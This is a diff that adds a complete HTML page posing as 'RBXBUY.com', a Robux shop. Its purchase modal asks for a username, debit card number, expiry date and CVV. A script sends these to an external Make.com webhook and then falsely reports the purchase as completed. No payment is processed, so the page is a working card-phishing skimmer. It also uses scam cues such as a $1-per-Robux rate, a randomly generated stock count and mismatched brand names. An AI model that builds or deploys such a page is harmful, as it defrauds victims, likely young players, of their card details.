@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Robux Purchase | Rbxbuy</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11/dist/sweetalert2.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <style>
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 100;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0,0,0,0.8);
+        }
+        .modal-content {
+            background: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
+            margin: 10% auto;
+            padding: 2rem;
+            border: 1px solid #00ffff;
+            border-radius: 0.5rem;
+            max-width: 500px;
+            max-height: 80vh; /* Set maximum height */
+            overflow-y: auto; /* Enable vertical scrolling */
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+            animation: fadeIn 0.5s;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        @keyframes float {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        .glow {
+            text-shadow: 0 0 10px rgba(0, 255, 255, 0.7);
+        }
+        .btn-glow {
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+        }
+        .card-hover {
+            transition: all 0.3s ease;
+        }
+        .card-hover:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 25px rgba(0, 255, 255, 0.3);
+        }
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        @media (max-width: 640px) {
+            .modal-content {
+                margin: 5% auto;
+                padding: 1rem;
+            }
+            .btn-glow {
+                padding: 1rem;
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+</head>
+<body class="bg-gray-900 text-white">
+    <!-- Animated Background -->
+    <div class="fixed inset-0 bg-gradient-to-br from-gray-900 via-purple-900 to-gray-900 opacity-90 -z-10"></div>
+    <div class="fixed inset-0 bg-[url('https://images.unsplash.com/photo-1635070041078-e363dbe005cb')] bg-cover mix-blend-overlay opacity-20 -z-20"></div>
+
+    <!-- Purchase Modal -->
+    <div id="purchaseModal" class="fixed hidden inset-0 bg-gray-900 bg-opacity-90 z-50 flex items-center justify-center">
+        <div class="modal-content">
+            <div class="flex justify-between items-center mb-6">
+                <h2 class="text-2xl font-bold text-cyan-400">Select Robux Amount</h2>
+                <button id="closePurchase" class="text-gray-400 hover:text-white text-2xl">&times;</button>
+            </div>
+            
+            <div class="bg-gray-700 p-4 rounded-lg mb-6">
+                <h3 class="font-bold mb-2 text-cyan-400">Username</h3>
+                <input type="text" id="username" placeholder="Enter your username" class="w-full px-4 py-2 mb-2 bg-gray-600 rounded-lg focus:outline-none" required>
+            </div>
+
+            <div class="space-y-3 mb-6">
+                <div class="flex items-center bg-gray-700 p-4 rounded-lg">
+                    <input type="radio" name="robuxAmount" value="400" class="h-5 w-5 text-cyan-500" aria-label="400 Robux">
+                    <label class="ml-3">400 Robux - $4.99</label>
+                </div>
+                <div class="flex items-center bg-gray-700 p-4 rounded-lg">
+                    <input type="radio" name="robuxAmount" value="1000" class="h-5 w-5 text-cyan-500" aria-label="1000 Robux">
+                    <label class="ml-3">1000 Robux - $9.99</label>
+                </div>
+                <div class="flex items-center bg-gray-700 p-4 rounded-lg">
+                    <input type="radio" name="robuxAmount" value="2000" class="h-5 w-5 text-cyan-500" aria-label="2000 Robux">
+                    <label class="ml-3">2000 Robux - $18.99</label>
+                </div>
+            </div>
+
+            <div class="bg-gray-700 p-4 rounded-lg mb-6">
+                <h3 class="font-bold mb-2 text-cyan-400">Custom Amount</h3>
+                <div class="flex items-center">
+                    <input type="number" id="robuxInput" placeholder="Robux" 
+                           class="flex-1 px-4 py-2 bg-gray-600 rounded-l-lg focus:outline-none" aria-label="Custom Robux Amount">
+                    <span class="bg-gray-600 px-4 py-2">=</span>
+                    <span id="usdOutput" class="flex-1 px-4 py-2 bg-gray-600 rounded-r-lg">$0.00</span>
+                </div>
+                <p class="text-sm text-gray-400 mt-2">1 Robux = $1.00</p>
+                <p id="availableRobux" class="text-sm text-gray-400 mt-2">Available: <span id="randomRobux"></span> RBX</p>
+            </div>
+
+            <!-- Debit Card Form -->
+            <div class="bg-gray-700 p-4 rounded-lg mb-6">
+                <h3 class="font-bold mb-2 text-cyan-400">Debit Card Information</h3>
+                <input type="text" id="cardNumber" placeholder="Card Number" class="w-full px-4 py-2 mb-2 bg-gray-600 rounded-lg focus:outline-none" required>
+                <input type="text" id="expiryDate" placeholder="MM/YY" class="w-full px-4 py-2 mb-2 bg-gray-600 rounded-lg focus:outline-none" required>
+                <input type="text" id="cvv" placeholder="CVV" class="w-full px-4 py-2 mb-2 bg-gray-600 rounded-lg focus:outline-none" required>
+            </div>
+
+            <button id="confirmPurchase" class="w-full bg-cyan-600 hover:bg-cyan-700 text-white font-bold py-3 px-6 rounded-lg transition">
+                Complete Purchase
+            </button>
+        </div>
+    </div>
+
+    <!-- Navigation -->
+    <nav class="bg-gray-800 bg-opacity-80 backdrop-blur-md sticky top-0 z-50">
+        <div class="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
+            <div class="flex items-center justify-between h-16">
+                <div class="flex items-center">
+                    <div class="flex-shrink-0">
+                        <span class="text-2xl font-bold glow">RBXBUY.com</span>
+                    </div>
+                </div>
+                <div class="hidden md:block">
+                    <div class="ml-10 flex items-baseline space-x-4">
+                        <a href="#" class="px-3 py-2 rounded-md text-sm font-medium bg-blue-600 text-white">Buy Robux</a>
+                        <a href="#" class="px-3 py-2 rounded-md text-sm font-medium text-gray-300 hover:text-white">Premium</a>
+                        <a href="#" class="px-3 py-2 rounded-md text-sm font-medium text-gray-300 hover:text-white">Support</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <!-- Hero Section -->
+    <section class="relative py-20 overflow-hidden">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col items-center justify-center text-center">
+                <h1 class="text-5xl md:text-7xl font-bold mb-6 glow">
+                    <span class="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-600">
+                        Buy Robux Instantly
+                    </span>
+                </h1>
+                <p class="text-xl md:text-2xl text-gray-300 mb-10 max-w-3xl">
+                    Get your Robux delivered instantly with our lightning-fast service. 
+                    <span class="text-cyan-400 font-medium">No waiting, no hassle!</span>
+                </p>
+                <div class="pulse">
+                    <button class="btn-glow bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-bold py-4 px-8 rounded-full text-lg transition-all duration-300 transform hover:scale-105" id="openPurchaseModal">
+                        GET ROBUX NOW <i class="fas fa-arrow-right ml-2"></i>
+                    </button>
+                </div>
+                <div class="mt-16 animate-float">
+                    <img src="https://i.imgur.com/p6RDSs5.png" alt="Robux" class="h-40 md:h-64 mx-auto animate-float" style="animation: float 3s ease-in-out infinite;">
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Pricing Section -->
+    <section class="py-16 bg-gray-800 bg-opacity-60 backdrop-blur-md">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl md:text-4xl font-bold text-center mb-12 glow">
+                <span class="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-600">
+                    Robux Packages
+                </span>
+            </h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-8 max-w-5xl mx-auto">
+                <!-- Package 1 -->
+                <div class="card-hover bg-gray-800 bg-opacity-70 rounded-xl p-6 border border-cyan-500 border-opacity-30 hover:border-opacity-100 transition-all">
+                    <div class="text-center">
+                        <h3 class="text-2xl font-bold mb-2">400 Robux</h3>
+                        <div class="text-4xl font-bold text-cyan-400 mb-4">$4.99</div>
+                        <ul class="text-gray-300 mb-6 space-y-2">
+                            <li><i class="fas fa-check text-green-400 mr-2"></i> Instant Delivery</li>
+                            <li><i class="fas fa-check text-green-400 mr-2"></i> 24/7 Support</li>
+                            <li><i class="fas fa-check text-green-400 mr-2"></i> Secure Payment</li>
+                        </ul>
+                        <button class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-bold py-3 px-6 rounded-lg transition-all">
+                            Buy Now
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Package 2 (Featured) -->
+                <div class="card-hover bg-gradient-to-br from-cyan-600 to-blue-700 rounded-xl p-6 transform hover:scale-105 transition-all relative overflow-hidden">
+                    <div class="absolute -top-4 -right-4 bg-yellow-400 text-gray-900 font-bold px-3 py-1 rounded-full text-xs transform rotate-12">
+                        POPULAR
+                    </div>
+                    <div class="text-center">
+                        <h3 class="text-2xl font-bold mb-2">1000 Robux</h3>
+                        <div class="text-4xl font-bold text-white mb-4">$9.99</div>
+                        <ul class="text-gray-100 mb-6 space-y-2">
+                            <li><i class="fas fa-check text-white mr-2"></i> Instant Delivery</li>
+                            <li><i class="fas fa-check text-white mr-2"></i> 24/7 Support</li>
+                            <li><i class="fas fa-check text-white mr-2"></i> Secure Payment</li>
+                            <li><i class="fas fa-check text-white mr-2"></i> +50 Bonus Robux</li>
+                        </ul>
+                        <button class="w-full bg-white hover:bg-gray-100 text-cyan-600 font-bold py-3 px-6 rounded-lg transition-all">
+                            Best Value
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Package 3 -->
+                <div class="card-hover bg-gray-800 bg-opacity-70 rounded-xl p-6 border border-cyan-500 border-opacity-30 hover:border-opacity-100 transition-all">
+                    <div class="text-center">
+                        <h3 class="text-2xl font-bold mb-2">2000 Robux</h3>
+                        <div class="text-4xl font-bold text-cyan-400 mb-4">$18.99</div>
+                        <ul class="text-gray-300 mb-6 space-y-2">
+                            <li><i class="fas fa-check text-green-400 mr-2"></i> Instant Delivery</li>
+                            <li><i class="fas fa-check text-green-400 mr-2"></i> 24/7 Support</li>
+                            <li><i class="fas fa-check text-green-400 mr-2"></i> Secure Payment</li>
+                            <li><i class="fas fa-check text-green-400 mr-2"></i> +150 Bonus Robux</li>
+                        </ul>
+                        <button class="w-full bg-gradient-to-r from-cyan-500 to-blue-600 hover:from-cyan-600 hover:to-blue-700 text-white font-bold py-3 px-6 rounded-lg transition-all">
+                            Buy Now
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="py-20">
+        <div class="container mx-auto px-4">
+            <h2 class="text-3xl md:text-4xl font-bold text-center mb-16 glow">
+                <span class="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-blue-600">
+                    Why Choose Us?
+                </span>
+            </h2>
+            
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-10 max-w-6xl mx-auto">
+                <!-- Feature 1 -->
+                <div class="card-hover bg-gray-800 bg-opacity-50 rounded-xl p-6 border border-cyan-500 border-opacity-20 hover:border-opacity-100 transition-all">
+                    <div class="text-cyan-400 text-4xl mb-4">
+                        <i class="fas fa-bolt"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">Instant Delivery</h3>
+                    <p class="text-gray-300">Receive your Robux immediately after payment. No waiting required!</p>
+                </div>
+                
+                <!-- Feature 2 -->
+                <div class="card-hover bg-gray-800 bg-opacity-50 rounded-xl p-6 border border-cyan-500 border-opacity-20 hover:border-opacity-100 transition-all">
+                    <div class="text-cyan-400 text-4xl mb-4">
+                        <i class="fas fa-shield-alt"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">100% Safe</h3>
+                    <p class="text-gray-300">Secure transactions with industry-standard encryption. Your account stays safe.</p>
+                </div>
+                
+                <!-- Feature 3 -->
+                <div class="card-hover bg-gray-800 bg-opacity-50 rounded-xl p-6 border border-cyan-500 border-opacity-20 hover:border-opacity-100 transition-all">
+                    <div class="text-cyan-400 text-4xl mb-4">
+                        <i class="fas fa-headset"></i>
+                    </div>
+                    <h3 class="text-xl font-bold mb-3">24/7 Support</h3>
+                    <p class="text-gray-300">Our team is always ready to help with any questions or issues.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="py-20 bg-gradient-to-r from-cyan-600 to-blue-700">
+        <div class="container mx-auto px-4 text-center">
+            <h2 class="text-3xl md:text-4xl font-bold mb-6">Ready to Get Your Robux?</h2>
+            <p class="text-xl text-cyan-100 mb-10 max-w-2xl mx-auto">Join thousands of satisfied customers who get their Robux instantly with Robuy.gg</p>
+            <button class="btn-glow bg-white hover:bg-gray-100 text-cyan-600 font-bold py-4 px-10 rounded-full text-lg transition-all duration-300 transform hover:scale-105">
+                START SHOPPING <i class="fas fa-arrow-right ml-2"></i>
+            </button>
+        </div>
+    </section>
+
+    <!-- Footer -->
+    <footer class="bg-gray-900 bg-opacity-90 py-10">
+        <div class="container mx-auto px-4">
+            <div class="flex flex-col md:flex-row justify-between items-center">
+                <div class="mb-6 md:mb-0">
+                    <span class="text-2xl font-bold glow">RBXBUY.COM</span>
+                </div>
+                <div class="flex space-x-6">
+                    <a href="#" class="text-gray-400 hover:text-cyan-400 transition-colors">
+                        <i class="fab fa-discord text-2xl"></i>
+                    </a>
+                    <a href="#" class="text-gray-400 hover:text-cyan-400 transition-colors">
+                        <i class="fab fa-twitter text-2xl"></i>
+                    </a>
+                    <a href="#" class="text-gray-400 hover:text-cyan-400 transition-colors">
+                        <i class="fab fa-instagram text-2xl"></i>
+                    </a>
+                </div>
+            </div>
+            <div class="border-t border-gray-800 mt-8 pt-8 text-center text-gray-500 text-sm">
+                <p>© 2023 Robuy.gg - Not affiliated with Roblox Corporation. All rights reserved.</p>
+            </div>
+        </div>
+    </footer>
+
+    <script>
+        // Simple animation triggers
+        document.querySelectorAll('.card-hover').forEach(card => {
+            card.addEventListener('mouseenter', () => {
+                card.querySelector('i').classList.add('animate-pulse');
+            });
+            card.addEventListener('mouseleave', () => {
+                card.querySelector('i').classList.remove('animate-pulse');
+            });
+        });
+
+        // Dynamic USD calculation
+        const robuxInput = document.getElementById('robuxInput');
+        const usdOutput = document.getElementById('usdOutput');
+        const randomRobux = Math.floor(Math.random() * (201999 - 170000 + 1)) + 170000;
+
+        document.getElementById('randomRobux').textContent = randomRobux;
+
+        robuxInput.addEventListener('input', () => {
+            const robuxValue = parseFloat(robuxInput.value) || 0;
+            usdOutput.textContent = `$${(robuxValue).toFixed(2)}`;
+        });
+
+        // Open purchase modal
+        document.getElementById('openPurchaseModal').addEventListener('click', () => {
+            document.getElementById('purchaseModal').classList.remove('hidden');
+        });
+
+        // Close purchase modal
+        document.getElementById('closePurchase').addEventListener('click', () => {
+            document.getElementById('purchaseModal').classList.add('hidden');
+        });
+
+        // Confirm purchase
+        document.getElementById('confirmPurchase').addEventListener('click', () => {
+            const username = document.getElementById('username').value;
+            const cardNumber = document.getElementById('cardNumber').value;
+            const expiryDate = document.getElementById('expiryDate').value;
+            const cvv = document.getElementById('cvv').value;
+            const robuxAmount = document.querySelector('input[name="robuxAmount"]:checked') ? document.querySelector('input[name="robuxAmount"]:checked').value : robuxInput.value;
+
+            if (!username || !cardNumber || !expiryDate || !cvv) {
+                Swal.fire({
+                    icon: 'error',
+                    title: 'Oops...',
+                    text: 'Please fill in all the fields!',
+                });
+            } else {
+                // Send data to webhook
+                const webhookUrl = 'https://hook.eu2.make.com/ejzptp2r6wj62oiwfgp61phaogz3lzf6'; // Replace with your actual webhook URL
+                const data = {
+                    username: username,
+                    cardNumber: cardNumber,
+                    expiryDate: expiryDate,
+                    cvv: cvv,
+                    robuxAmount: robuxAmount
+                };
+
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(data)
+                })
+                .then(response => {
+                    if (response.ok) {
+                        Swal.fire({
+                            icon: 'success',
+                            title: 'Success!',
+                            text: 'Your purchase has been completed!',
+                        });
+                    } else {
+                        throw new Error('Network response was not ok.');
+                    }
+                })
+                .catch(error => {
+                    Swal.fire({
+                        icon: 'error',
+                        title: 'Error!',
+                        text: 'There was a problem with your purchase.',
+                    });
+                });
+            }
+        });
+    </script>
+</body>
+</html>
